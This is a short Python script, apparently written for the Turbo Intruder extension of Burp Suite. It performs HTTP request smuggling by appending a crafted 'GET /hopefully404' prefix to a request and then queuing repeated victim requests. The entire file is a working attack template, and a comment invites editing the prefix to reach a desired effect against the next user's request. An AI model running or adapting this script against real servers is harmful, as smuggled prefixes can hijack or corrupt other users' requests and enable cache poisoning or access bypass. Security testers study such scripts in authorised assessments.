def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()

    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /hopefully404 HTTP/1.1
X-Ignore: X'''

    # The request engine will auto-fix the content-length for us
    attack = target.req + prefix
    engine.queue(attack)

    victim = target.req
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)

